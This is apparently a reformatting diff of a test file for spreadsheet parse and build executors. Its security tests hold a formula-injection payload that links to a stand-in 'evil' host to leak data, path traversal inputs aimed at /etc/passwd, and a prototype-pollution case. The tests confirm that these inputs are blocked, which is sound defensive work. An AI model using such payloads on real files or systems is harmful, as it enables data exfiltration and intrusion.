@@ -33,12 +33,20 @@ const XLSX_MIME = 'application/vnd.openxmlformats-officedocument.spreadsheetml.s
 vi.mock('@/lib/logger.js');
 
 import {
-  xlsxParseExecutor, xlsxBuildExecutor,
-  fmtCode, coerceForFormat, inferFormatFromName, parseColumnsConfig,
+  xlsxParseExecutor,
+  xlsxBuildExecutor,
+  fmtCode,
+  coerceForFormat,
+  inferFormatFromName,
+  parseColumnsConfig,
 } from './excel.js';
 
 const ctx: NodeExecutionContext = {
-  tenantId: 't1', runId: 'r1', workflowId: 'wf1', nodeId: 'n1', secrets: {},
+  tenantId: 't1',
+  runId: 'r1',
+  workflowId: 'wf1',
+  nodeId: 'n1',
+  secrets: {},
 } as NodeExecutionContext;
 
 // Helper: build a real XLSX buffer with given sheet/rows
@@ -121,7 +129,7 @@ describe('coerceForFormat — type coercion for Excel formatting', () => {
   });
 
   it('percent normalize: 0.10 (already decimal ≤ 1) → 0.10 unchanged', () => {
-    expect(coerceForFormat(0.10, 'percent_2')).toBeCloseTo(0.10, 4);
+    expect(coerceForFormat(0.1, 'percent_2')).toBeCloseTo(0.1, 4);
   });
 
   it('integer truncates: 10.7 → 10', () => {
@@ -174,9 +182,20 @@ describe('parseColumnsConfig — config parsing', () => {
 
 describe('🚨 xlsxParseExecutor', () => {
   it('parse base64 input → rows with column keys', async () => {
-    const buf = await buildXlsx('Sheet1', ['sku', 'qta'], [['A001', 5], ['A002', 10]]);
+    const buf = await buildXlsx(
+      'Sheet1',
+      ['sku', 'qta'],
+      [
+        ['A001', 5],
+        ['A002', 10],
+      ],
+    );
     const r = await xlsxParseExecutor({ base64: buf.toString('base64') }, null, ctx);
-    const out = r.output as { rows: Record<string, unknown>[]; totalRows: number; columns: string[] };
+    const out = r.output as {
+      rows: Record<string, unknown>[];
+      totalRows: number;
+      columns: string[];
+    };
     expect(out.totalRows).toBe(2);
     expect(out.columns).toEqual(['sku', 'qta']);
     expect(out.rows[0]).toEqual({ sku: 'A001', qta: 5 });
@@ -199,7 +218,11 @@ describe('🚨 xlsxParseExecutor', () => {
     s2.addRow(['b']);
     s2.addRow(['v2']);
     const buf = Buffer.from(await wb.xlsx.writeBuffer());
-    const r = await xlsxParseExecutor({ base64: buf.toString('base64'), sheetName: 'Second' }, null, ctx);
+    const r = await xlsxParseExecutor(
+      { base64: buf.toString('base64'), sheetName: 'Second' },
+      null,
+      ctx,
+    );
     const out = r.output as { sheetName: string; rows: Record<string, unknown>[] };
     expect(out.sheetName).toBe('Second');
     expect(out.rows[0]).toEqual({ b: 'v2' });
@@ -207,13 +230,13 @@ describe('🚨 xlsxParseExecutor', () => {
 
   it('🚨 sheetName not found → throw con available list', async () => {
     const buf = await buildXlsx('Only', ['x'], [['y']]);
-    await expect(xlsxParseExecutor({ base64: buf.toString('base64'), sheetName: 'Missing' }, null, ctx))
-      .rejects.toThrow(/sheet not found.*Only/u);
+    await expect(
+      xlsxParseExecutor({ base64: buf.toString('base64'), sheetName: 'Missing' }, null, ctx),
+    ).rejects.toThrow(/sheet not found.*Only/u);
   });
 
   it('🚨 no input → throw esplicito', async () => {
-    await expect(xlsxParseExecutor({}, null, ctx))
-      .rejects.toThrow(/missing input/u);
+    await expect(xlsxParseExecutor({}, null, ctx)).rejects.toThrow(/missing input/u);
   });
 
   it('🚨 SECURITY: header __proto__/constructor (ostile) → rinominato a col_N, nessuna pollution', async () => {
@@ -227,7 +250,7 @@ describe('🚨 xlsxParseExecutor', () => {
     expect(row.col_1).toBe('x');
     expect(row.safe).toBe('ok');
     // anti-pollution: un oggetto vergine non è stato contaminato; proto intatto.
-    expect((({}) as Record<string, unknown>).x).toBeUndefined();
+    expect(({} as Record<string, unknown>).x).toBeUndefined();
     expect(Object.getPrototypeOf(row)).toBe(Object.prototype);
   });
 
@@ -258,8 +281,16 @@ describe('🚨 GAP2 capstone — xlsxParse accetta input BinaryData (resolver, v
   it('🚨 input BinaryData ref → risolto via readBinary → righe parsate (trasparente)', async () => {
     const xlsx = await buildXlsx('Sheet1', ['sku', 'qta'], [['A001', 5]]);
     const readBinary = vi.fn(async (_r: string) => xlsx);
-    const bin = makeBinaryRef({ mimeType: XLSX_MIME, ref: 'a'.repeat(64), size: xlsx.length, fileName: 'data.xlsx' });
-    const r = await xlsxParseExecutor({}, bin, { ...ctx, readBinary } as unknown as NodeExecutionContext);
+    const bin = makeBinaryRef({
+      mimeType: XLSX_MIME,
+      ref: 'a'.repeat(64),
+      size: xlsx.length,
+      fileName: 'data.xlsx',
+    });
+    const r = await xlsxParseExecutor({}, bin, {
+      ...ctx,
+      readBinary,
+    } as unknown as NodeExecutionContext);
     expect(readBinary).toHaveBeenCalledWith('a'.repeat(64));
     const out = r.output as { rows: Record<string, unknown>[] };
     expect(out.rows[0]).toEqual({ sku: 'A001', qta: 5 });
@@ -289,11 +320,20 @@ describe('🚨 GAP2 capstone — xlsxParse accetta input BinaryData (resolver, v
 
 describe('🚨 xlsxBuildExecutor', () => {
   it('build single sheet from input array → roundtrip via parse', async () => {
-    const r = await xlsxBuildExecutor({ sheetName: 'Test' }, [
-      { sku: 'A001', qta: 5 },
-      { sku: 'A002', qta: 10 },
-    ], ctx);
-    const out = r.output as { binary: BinaryData; rowsWritten: number; sheetName: string; contentType: string };
+    const r = await xlsxBuildExecutor(
+      { sheetName: 'Test' },
+      [
+        { sku: 'A001', qta: 5 },
+        { sku: 'A002', qta: 10 },
+      ],
+      ctx,
+    );
+    const out = r.output as {
+      binary: BinaryData;
+      rowsWritten: number;
+      sheetName: string;
+      contentType: string;
+    };
     expect(out.rowsWritten).toBe(2);
     expect(out.sheetName).toBe('Test');
     expect(out.contentType).toContain('spreadsheetml.sheet');
@@ -308,16 +348,19 @@ describe('🚨 xlsxBuildExecutor', () => {
   });
 
   it('build 🚨 throws when no rows', async () => {
-    await expect(xlsxBuildExecutor({}, null, ctx))
-      .rejects.toThrow(/nothing to write/u);
+    await expect(xlsxBuildExecutor({}, null, ctx)).rejects.toThrow(/nothing to write/u);
   });
 
   it('multi-sheet via groupByKey: 2 marchi → 2 sheet', async () => {
-    const r = await xlsxBuildExecutor({ groupByKey: 'marchio' }, [
-      { marchio: 'Acme', sku: 'A1' },
-      { marchio: 'Acme', sku: 'A2' },
-      { marchio: 'Brand2', sku: 'B1' },
-    ], ctx);
+    const r = await xlsxBuildExecutor(
+      { groupByKey: 'marchio' },
+      [
+        { marchio: 'Acme', sku: 'A1' },
+        { marchio: 'Acme', sku: 'A2' },
+        { marchio: 'Brand2', sku: 'B1' },
+      ],
+      ctx,
+    );
     const out = r.output as { sheetName: string };
     expect(out.sheetName).toContain('Acme');
     expect(out.sheetName).toContain('Brand2');
@@ -325,9 +368,11 @@ describe('🚨 xlsxBuildExecutor', () => {
   });
 
   it('multi-sheet: sheet name sanitization (\\\\/?*[]: replaced)', async () => {
-    const r = await xlsxBuildExecutor({ groupByKey: 'badname' }, [
-      { badname: 'a/b*c?', value: 1 },
-    ], ctx);
+    const r = await xlsxBuildExecutor(
+      { groupByKey: 'badname' },
+      [{ badname: 'a/b*c?', value: 1 }],
+      ctx,
+    );
     const out = r.output as { sheetName: string };
     expect(out.sheetName).not.toContain('/');
     expect(out.sheetName).not.toContain('*');
@@ -342,7 +387,14 @@ describe('🚨 xlsxBuildExecutor', () => {
   });
 
   it('multi-sheet: empty value → "(senza valore)"', async () => {
-    const r = await xlsxBuildExecutor({ groupByKey: 'k' }, [{ k: null, v: 1 }, { k: '', v: 2 }], ctx);
+    const r = await xlsxBuildExecutor(
+      { groupByKey: 'k' },
+      [
+        { k: null, v: 1 },
+        { k: '', v: 2 },
+      ],
+      ctx,
+    );
     const out = r.output as { sheetName: string };
     expect(out.sheetName).toContain('senza valore');
   });
@@ -358,8 +410,9 @@ describe('🚨 xlsxBuildExecutor', () => {
   });
 
   it('🚨 path traversal denied: ../etc/passwd', async () => {
-    await expect(xlsxBuildExecutor({ path: '../../../etc/passwd.xlsx' }, [{ x: 1 }], ctx))
-      .rejects.toThrow(/outside tenant namespace/u);
+    await expect(
+      xlsxBuildExecutor({ path: '../../../etc/passwd.xlsx' }, [{ x: 1 }], ctx),
+    ).rejects.toThrow(/outside tenant namespace/u);
   });
 });
 
@@ -380,9 +433,14 @@ describe('🚨 formula injection escape (OWASP CSV/XLSX injection)', () => {
   }
 
   it('🚨 =HYPERLINK(...) → XML NON contiene <f> tag (no formula written)', async () => {
-    const r = await xlsxBuildExecutor({
-      forceItalianStrings: 'false', columns: 'note:Note:text',
-    }, [{ note: '=HYPERLINK("http://evil/leak")' }], ctx);
+    const r = await xlsxBuildExecutor(
+      {
+        forceItalianStrings: 'false',
+        columns: 'note:Note:text',
+      },
+      [{ note: '=HYPERLINK("http://evil/leak")' }],
+      ctx,
+    );
     const out = r.output as { binary: { data?: string } };
     const xml = await inspectInternalXml(out.binary.data ?? '');
     expect(xml).not.toMatch(/<f[\s>]/u);
@@ -391,18 +449,28 @@ describe('🚨 formula injection escape (OWASP CSV/XLSX injection)', () => {
   });
 
   it('🚨 4 trigger chars (= + - @) tutti NON producono <f> nel XML', async () => {
-    const r = await xlsxBuildExecutor({
-      forceItalianStrings: 'false', columns: 'a:A:text,b:B:text,c:C:text,d:D:text',
-    }, [{ a: '=1+1', b: '+EVIL', c: '-EVIL', d: '@EVIL' }], ctx);
+    const r = await xlsxBuildExecutor(
+      {
+        forceItalianStrings: 'false',
+        columns: 'a:A:text,b:B:text,c:C:text,d:D:text',
+      },
+      [{ a: '=1+1', b: '+EVIL', c: '-EVIL', d: '@EVIL' }],
+      ctx,
+    );
     const out = r.output as { binary: { data?: string } };
     const xml = await inspectInternalXml(out.binary.data ?? '');
     expect(xml).not.toMatch(/<f[\s>]/u);
   });
 
   it('valore innocuo (no trigger char) NON modificato — header config matching', async () => {
-    const r = await xlsxBuildExecutor({
-      forceItalianStrings: 'false', columns: 'note:Note:text',
-    }, [{ note: 'normal text' }], ctx);
+    const r = await xlsxBuildExecutor(
+      {
+        forceItalianStrings: 'false',
+        columns: 'note:Note:text',
+      },
+      [{ note: 'normal text' }],
+      ctx,
+    );
     const out = r.output as { binary: BinaryData };
     const r2 = await xlsxParseExecutor({}, out.binary, ctx); // build→parse via handle
     const out2 = r2.output as { rows: Record<string, unknown>[] };
@@ -413,15 +481,17 @@ describe('🚨 formula injection escape (OWASP CSV/XLSX injection)', () => {
 
 describe('🚨 path security', () => {
   it('parse: path traversal denied', async () => {
-    await expect(xlsxParseExecutor({ path: '../../../etc/passwd' }, null, ctx))
-      .rejects.toThrow(/outside tenant namespace/u);
+    await expect(xlsxParseExecutor({ path: '../../../etc/passwd' }, null, ctx)).rejects.toThrow(
+      /outside tenant namespace/u,
+    );
   });
 
   it('parse: empty path → throw "file path is empty"', async () => {
     // path '   ' viene asString-normalized a '   ' (truthy → entra in branch path)
     // assertPathAllowed riceve '   ' → throw 'file path is empty' (trim check)
-    await expect(xlsxParseExecutor({ path: '   ' }, null, ctx))
-      .rejects.toThrow(/file path is empty/u);
+    await expect(xlsxParseExecutor({ path: '   ' }, null, ctx)).rejects.toThrow(
+      /file path is empty/u,
+    );
   });
 });
 
@@ -430,7 +500,11 @@ describe('output shape', () => {
     const r = await xlsxBuildExecutor({}, [{ a: 1 }], ctx);
     expect(r).toMatchObject({
       output: {
-        binary: { __ffBinary: true, encoding: 'base64', mimeType: expect.stringContaining('spreadsheetml') },
+        binary: {
+          __ffBinary: true,
+          encoding: 'base64',
+          mimeType: expect.stringContaining('spreadsheetml'),
+        },
         sizeBytes: expect.any(Number),
         fileName: expect.any(String),
         contentType: expect.stringContaining('spreadsheetml'),
@@ -445,7 +519,11 @@ describe('output shape', () => {
 
 // Cleanup tempdir after each test
 afterEach(() => {
-  try { rmSync(tenantDir, { recursive: true, force: true }); } catch { /* ignore */ }
+  try {
+    rmSync(tenantDir, { recursive: true, force: true });
+  } catch {
+    /* ignore */
+  }
 });
 
 import { afterEach } from 'vitest';
@@ -457,7 +535,12 @@ describe('🚨 xlsxParseExecutor — metadata (columnCount/headerRow/emptyCellsC
   it('columnCount = numero colonne, headerRow echo della config, truncated false', async () => {
     const buf = await buildXlsx('S', ['a', 'b', 'c'], [[1, 2, 3]]);
     const r = await xlsxParseExecutor({ base64: buf.toString('base64'), headerRow: 1 }, null, ctx);
-    const out = r.output as { columnCount: number; headerRow: number; columns: string[]; truncated: boolean };
+    const out = r.output as {
+      columnCount: number;
+      headerRow: number;
+      columns: string[];
+      truncated: boolean;
+    };
     expect(out.columnCount).toBe(3);
     expect(out.columnCount).toBe(out.columns.length);
     expect(out.headerRow).toBe(1);
@@ -467,7 +550,14 @@ describe('🚨 xlsxParseExecutor — metadata (columnCount/headerRow/emptyCellsC
   it('🚨 emptyCellsCount conta le celle vuote (consistenza filter downstream)', async () => {
     // Righe PARZIALMENTE piene (le righe TUTTE vuote vengono saltate da hasValues):
     // row1 b vuota, row2 a vuota → 2 celle vuote su 2 righe valorizzate.
-    const buf = await buildXlsx('S', ['a', 'b'], [['x', null], [null, 'z']]);
+    const buf = await buildXlsx(
+      'S',
+      ['a', 'b'],
+      [
+        ['x', null],
+        [null, 'z'],
+      ],
+    );
     const r = await xlsxParseExecutor({ base64: buf.toString('base64') }, null, ctx);
     const out = r.output as { emptyCellsCount: number; totalRows: number };
     expect(out.totalRows).toBe(2);
